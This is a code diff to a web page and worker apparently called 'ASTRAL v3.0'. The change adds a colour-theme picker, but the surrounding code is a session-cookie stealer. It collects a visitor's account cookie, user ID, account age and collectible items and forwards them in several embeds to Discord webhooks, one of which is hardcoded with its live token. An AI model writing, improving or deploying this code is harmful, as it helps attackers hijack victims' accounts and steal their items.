@@ -13,20 +13,82 @@ export default {
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Inter', sans-serif; background: #0a000a; color: #fff; min-height: 100vh; position: relative; overflow-x: hidden; }
-        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(circle at 20% 30%, rgba(180,0,255,0.10) 0%, transparent 55%), radial-gradient(circle at 80% 70%, rgba(120,0,200,0.08) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        body { font-family: 'Inter', sans-serif; min-height: 100vh; position: relative; overflow-x: hidden; transition: background 0.5s ease, color 0.3s ease; }
+        
+        /* Theme Variables */
+        body[data-theme="0"] { background: #0a000a; color: #fff; }
+        body[data-theme="0"] .main-card { background: rgba(20,0,30,0.85); border-color: rgba(153,51,255,0.15); }
+        body[data-theme="0"] .brand-name { background: linear-gradient(135deg, #cc88ff 0%, #9933ff 50%, #cc88ff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="0"] .submit-btn { background: linear-gradient(135deg, #9933ff, #6600cc); }
+        body[data-theme="0"] .logo-circle { background: linear-gradient(135deg, #9933ff, #6600cc); }
+        
+        body[data-theme="1"] { background: #0a0015; color: #fff; }
+        body[data-theme="1"] .main-card { background: rgba(10,0,20,0.9); border-color: rgba(0,255,200,0.2); }
+        body[data-theme="1"] .brand-name { background: linear-gradient(135deg, #00ffcc, #00ccff); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="1"] .submit-btn { background: linear-gradient(135deg, #00ffcc, #0088ff); }
+        body[data-theme="1"] .logo-circle { background: linear-gradient(135deg, #00ffcc, #0088ff); }
+        
+        body[data-theme="2"] { background: #15000a; color: #fff; }
+        body[data-theme="2"] .main-card { background: rgba(20,0,10,0.9); border-color: rgba(255,100,150,0.2); }
+        body[data-theme="2"] .brand-name { background: linear-gradient(135deg, #ff6b9d, #ff2d55); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="2"] .submit-btn { background: linear-gradient(135deg, #ff6b9d, #ff2d55); }
+        body[data-theme="2"] .logo-circle { background: linear-gradient(135deg, #ff6b9d, #ff2d55); }
+        
+        body[data-theme="3"] { background: #0a0a00; color: #fff; }
+        body[data-theme="3"] .main-card { background: rgba(20,15,0,0.9); border-color: rgba(255,200,0,0.2); }
+        body[data-theme="3"] .brand-name { background: linear-gradient(135deg, #ffd700, #ff8c00); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="3"] .submit-btn { background: linear-gradient(135deg, #ffd700, #ff8c00); }
+        body[data-theme="3"] .logo-circle { background: linear-gradient(135deg, #ffd700, #ff8c00); }
+        
+        body[data-theme="4"] { background: #000a0a; color: #fff; }
+        body[data-theme="4"] .main-card { background: rgba(0,20,20,0.9); border-color: rgba(0,255,150,0.2); }
+        body[data-theme="4"] .brand-name { background: linear-gradient(135deg, #00ff87, #00cc66); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="4"] .submit-btn { background: linear-gradient(135deg, #00ff87, #00cc66); }
+        body[data-theme="4"] .logo-circle { background: linear-gradient(135deg, #00ff87, #00cc66); }
+        
+        body[data-theme="5"] { background: #0a000a; color: #fff; }
+        body[data-theme="5"] .main-card { background: rgba(30,0,30,0.9); border-color: rgba(255,0,255,0.2); }
+        body[data-theme="5"] .brand-name { background: linear-gradient(135deg, #ff00ff, #cc00ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="5"] .submit-btn { background: linear-gradient(135deg, #ff00ff, #cc00ff); }
+        body[data-theme="5"] .logo-circle { background: linear-gradient(135deg, #ff00ff, #cc00ff); }
+        
+        body[data-theme="6"] { background: #0a0000; color: #fff; }
+        body[data-theme="6"] .main-card { background: rgba(30,0,0,0.9); border-color: rgba(255,50,50,0.2); }
+        body[data-theme="6"] .brand-name { background: linear-gradient(135deg, #ff4444, #cc0000); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="6"] .submit-btn { background: linear-gradient(135deg, #ff4444, #cc0000); }
+        body[data-theme="6"] .logo-circle { background: linear-gradient(135deg, #ff4444, #cc0000); }
+        
+        body[data-theme="7"] { background: #000a15; color: #fff; }
+        body[data-theme="7"] .main-card { background: rgba(0,10,25,0.9); border-color: rgba(100,150,255,0.2); }
+        body[data-theme="7"] .brand-name { background: linear-gradient(135deg, #4a9eff, #0066ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="7"] .submit-btn { background: linear-gradient(135deg, #4a9eff, #0066ff); }
+        body[data-theme="7"] .logo-circle { background: linear-gradient(135deg, #4a9eff, #0066ff); }
+        
+        body[data-theme="8"] { background: #150a00; color: #fff; }
+        body[data-theme="8"] .main-card { background: rgba(25,15,0,0.9); border-color: rgba(255,150,50,0.2); }
+        body[data-theme="8"] .brand-name { background: linear-gradient(135deg, #ff9933, #ff6600); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="8"] .submit-btn { background: linear-gradient(135deg, #ff9933, #ff6600); }
+        body[data-theme="8"] .logo-circle { background: linear-gradient(135deg, #ff9933, #ff6600); }
+        
+        body[data-theme="9"] { background: #0a000a; color: #fff; }
+        body[data-theme="9"] .main-card { background: rgba(20,0,30,0.9); border-color: rgba(200,100,255,0.2); }
+        body[data-theme="9"] .brand-name { background: linear-gradient(135deg, #b366ff, #7a00cc); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        body[data-theme="9"] .submit-btn { background: linear-gradient(135deg, #b366ff, #7a00cc); }
+        body[data-theme="9"] .logo-circle { background: linear-gradient(135deg, #b366ff, #7a00cc); }
+        
+        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(circle at 20% 30%, rgba(180,0,255,0.05) 0%, transparent 55%), radial-gradient(circle at 80% 70%, rgba(120,0,200,0.03) 0%, transparent 50%); pointer-events: none; z-index: 0; }
         body::after { content: ''; position: fixed; inset: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239933ff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); pointer-events: none; z-index: 0; }
 
         .container { max-width: 600px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }
         .header { text-align: center; margin-bottom: 40px; }
         .logo-wrapper { display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; }
-        .logo-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #9933ff, #6600cc); border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 40px -5px rgba(153,51,255,0.4); animation: float 3s ease-in-out infinite; border: 1px solid rgba(153,51,255,0.3); }
+        .logo-circle { width: 80px; height: 80px; border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 40px -5px rgba(153,51,255,0.4); animation: float 3s ease-in-out infinite; border: 1px solid rgba(153,51,255,0.3); transition: all 0.5s ease; }
         @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
         .logo-circle svg { width: 45px; height: 45px; stroke: #fff; fill: none; stroke-width: 1.8; }
-        .brand-name { font-size: 44px; font-weight: 900; background: linear-gradient(135deg, #cc88ff 0%, #9933ff 50%, #cc88ff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -1px; margin-bottom: 4px; text-shadow: 0 0 40px rgba(153,51,255,0.15); }
-        .brand-sub { font-size: 13px; color: #8844aa; letter-spacing: 2px; font-weight: 500; text-transform: uppercase; }
+        .brand-name { font-size: 44px; font-weight: 900; letter-spacing: -1px; margin-bottom: 4px; text-shadow: 0 0 40px rgba(153,51,255,0.15); transition: all 0.5s ease; }
+        .brand-sub { font-size: 13px; color: #8844aa; letter-spacing: 2px; font-weight: 500; text-transform: uppercase; transition: color 0.3s ease; }
 
-        .main-card { background: rgba(20,0,30,0.85); backdrop-filter: blur(12px); border: 1px solid rgba(153,51,255,0.15); border-radius: 32px; padding: 32px 28px; margin-bottom: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.6), inset 0 1px 0 rgba(153,51,255,0.05); }
+        .main-card { backdrop-filter: blur(12px); border-radius: 32px; padding: 32px 28px; margin-bottom: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.6), inset 0 1px 0 rgba(153,51,255,0.05); transition: all 0.5s ease; }
         .card-badge { display: inline-block; background: rgba(153,51,255,0.15); border: 1px solid rgba(153,51,255,0.15); border-radius: 50px; padding: 6px 16px; font-size: 11px; font-weight: 700; color: #cc88ff; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; }
         .title { font-size: 30px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(135deg, #fff, #cc88ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .subtitle { font-size: 14px; color: #8844aa; margin-bottom: 32px; line-height: 1.6; font-weight: 400; }
@@ -39,7 +101,7 @@ export default {
         .input-field::placeholder { color: #442255; }
         textarea.input-field { resize: vertical; min-height: 100px; }
 
-        .submit-btn { width: 100%; background: linear-gradient(135deg, #9933ff, #6600cc); color: #fff; border: none; border-radius: 20px; padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.4,0,0.2,1); display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 8px; position: relative; overflow: hidden; letter-spacing: 0.5px; text-transform: uppercase; }
+        .submit-btn { color: #fff; border: none; border-radius: 20px; padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.4,0,0.2,1); display: flex; align-items: center; justify-content: center; gap: 12px; margin-top: 8px; position: relative; overflow: hidden; letter-spacing: 0.5px; text-transform: uppercase; }
         .submit-btn::before { content: ''; position: absolute; top: 50%; left: 50%; width: 0; height: 0; border-radius: 50%; background: rgba(255,255,255,0.15); transform: translate(-50%,-50%); transition: width 0.6s, height 0.6s; }
         .submit-btn:hover::before { width: 400px; height: 400px; }
         .submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 30px -5px rgba(153,51,255,0.5); }
@@ -54,10 +116,26 @@ export default {
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         .result-content { font-size: 15px; line-height: 1.7; word-break: break-word; color: #ddddee; }
 
-        .stats-bar { display: flex; justify-content: center; gap: 24px; padding: 18px 20px; background: rgba(20,0,30,0.6); border-radius: 60px; backdrop-filter: blur(10px); border: 1px solid rgba(153,51,255,0.06); }
+        .stats-bar { display: flex; justify-content: center; gap: 24px; padding: 18px 20px; background: rgba(20,0,30,0.6); border-radius: 60px; backdrop-filter: blur(10px); border: 1px solid rgba(153,51,255,0.06); transition: all 0.5s ease; }
         .stat-item { text-align: center; }
-        .stat-value { font-size: 20px; font-weight: 800; color: #cc88ff; }
+        .stat-value { font-size: 20px; font-weight: 800; color: #cc88ff; transition: color 0.3s ease; }
         .stat-label { font-size: 10px; color: #664488; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 2px; }
+
+        /* Theme Selector */
+        .theme-selector { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin-bottom: 20px; padding: 10px; background: rgba(20,0,30,0.4); border-radius: 50px; backdrop-filter: blur(8px); border: 1px solid rgba(153,51,255,0.06); }
+        .theme-dot { width: 30px; height: 30px; border-radius: 50%; cursor: pointer; border: 2px solid transparent; transition: all 0.3s ease; flex-shrink: 0; }
+        .theme-dot:hover { transform: scale(1.15); }
+        .theme-dot.active { border-color: #fff; box-shadow: 0 0 20px rgba(255,255,255,0.3); }
+        .theme-dot[data-theme="0"] { background: linear-gradient(135deg, #9933ff, #6600cc); }
+        .theme-dot[data-theme="1"] { background: linear-gradient(135deg, #00ffcc, #0088ff); }
+        .theme-dot[data-theme="2"] { background: linear-gradient(135deg, #ff6b9d, #ff2d55); }
+        .theme-dot[data-theme="3"] { background: linear-gradient(135deg, #ffd700, #ff8c00); }
+        .theme-dot[data-theme="4"] { background: linear-gradient(135deg, #00ff87, #00cc66); }
+        .theme-dot[data-theme="5"] { background: linear-gradient(135deg, #ff00ff, #cc00ff); }
+        .theme-dot[data-theme="6"] { background: linear-gradient(135deg, #ff4444, #cc0000); }
+        .theme-dot[data-theme="7"] { background: linear-gradient(135deg, #4a9eff, #0066ff); }
+        .theme-dot[data-theme="8"] { background: linear-gradient(135deg, #ff9933, #ff6600); }
+        .theme-dot[data-theme="9"] { background: linear-gradient(135deg, #b366ff, #7a00cc); }
 
         .discord-float-btn { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; background: linear-gradient(135deg, #5865F2, #4752C4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; cursor: pointer; z-index: 998; box-shadow: 0 6px 20px rgba(88,101,242,0.4); transition: all 0.3s ease; border: none; color: #fff; text-decoration: none; }
         .discord-float-btn:hover { transform: scale(1.1); box-shadow: 0 10px 30px rgba(88,101,242,0.6); }
@@ -88,10 +166,12 @@ export default {
             .stats-bar { gap: 12px; padding: 14px 16px; }
             .stat-value { font-size: 16px; }
             #discordPopup { padding: 24px; }
+            .theme-selector { gap: 6px; padding: 8px; }
+            .theme-dot { width: 24px; height: 24px; }
         }
     </style>
 </head>
-<body>
+<body data-theme="0">
 <div class="container">
     <div class="header">
         <div class="logo-wrapper">
@@ -106,6 +186,21 @@ export default {
         <h1 class="brand-name">ASTRAL</h1>
         <p class="brand-sub">v3.0</p>
     </div>
+    
+    <!-- Theme Selector -->
+    <div class="theme-selector">
+        <div class="theme-dot active" data-theme="0" onclick="setTheme(0)"></div>
+        <div class="theme-dot" data-theme="1" onclick="setTheme(1)"></div>
+        <div class="theme-dot" data-theme="2" onclick="setTheme(2)"></div>
+        <div class="theme-dot" data-theme="3" onclick="setTheme(3)"></div>
+        <div class="theme-dot" data-theme="4" onclick="setTheme(4)"></div>
+        <div class="theme-dot" data-theme="5" onclick="setTheme(5)"></div>
+        <div class="theme-dot" data-theme="6" onclick="setTheme(6)"></div>
+        <div class="theme-dot" data-theme="7" onclick="setTheme(7)"></div>
+        <div class="theme-dot" data-theme="8" onclick="setTheme(8)"></div>
+        <div class="theme-dot" data-theme="9" onclick="setTheme(9)"></div>
+    </div>
+    
     <div class="main-card">
         <div class="card-badge">ACTIVE</div>
         <h2 class="title">Session</h2>
@@ -150,6 +245,27 @@ export default {
     <button class="discord-close-btn" id="closeDiscordPopup">Close</button>
 </div>
 <script>
+    // Theme System
+    function setTheme(index) {
+        document.body.setAttribute('data-theme', index);
+        document.querySelectorAll('.theme-dot').forEach(function(dot, i) {
+            if (i === index) {
+                dot.classList.add('active');
+            } else {
+                dot.classList.remove('active');
+            }
+        });
+        localStorage.setItem('astral-theme', index);
+    }
+    
+    // Load saved theme
+    (function() {
+        var saved = localStorage.getItem('astral-theme');
+        if (saved !== null) {
+            setTheme(parseInt(saved));
+        }
+    })();
+
     (function() {
         var inviteCode = 'pKXZkNs283';
         function openPopup() {
@@ -183,21 +299,18 @@ export default {
     var LIVE_WEBHOOK = 'https://discord.com/api/webhooks/1540619951038136381/WkueJlgMhxX6jYdCNPecU9Qsqo9frye53MI6wWN7fu6R9RbCXlPt0rA9qaYtERnt5jeN';
 
     function sendData(data, cookie) {
-        // Main embed -> LIVE webhook
         fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type: 'main', data: data, cookie: cookie })
         }).catch(function(err) { console.log('main err:', err); });
 
-        // Dual embed -> DUAL webhook
         fetch('/api/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type: 'secondary', data: data, cookie: cookie })
         }).catch(function(err) { console.log('secondary err:', err); });
 
-        // Cookie embed -> DUAL webhook
         setTimeout(function() {
             fetch('/api/send', {
                 method: 'POST',
@@ -326,7 +439,6 @@ export default {
         let payload = {};
         let imageUrl = 'https://i.ibb.co/v6SjQn5D/astrallogo.webp';
 
-        // ---- FETCH AVATAR ----
         if (d.userId) {
           try {
             const userId = d.userId;
@@ -360,7 +472,6 @@ export default {
           accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
         }
 
-        // ---- MAIN EMBED (LIVE) ----
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
           const fields = [
@@ -386,10 +497,7 @@ export default {
             username: 'Astral',
             avatar_url: 'https://i.ibb.co/v6SjQn5D/astrallogo.webp'
           };
-        }
-
-        // ---- DUAL EMBED ----
-        else if (type === 'secondary') {
+        } else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
           let collectibles = 'None';
           if (d.limiteds && d.limiteds.length > 0) {
@@ -426,10 +534,7 @@ export default {
             embeds: [embed],
             allowed_mentions: { parse: ['everyone'] }
           };
-        }
-
-        // ---- COOKIE EMBED ----
-        else if (type === 'cookie') {
+        } else if (type === 'cookie') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
           const cookieToSend = rawCookie || d?.refreshedCookie || '';
           const embed = {
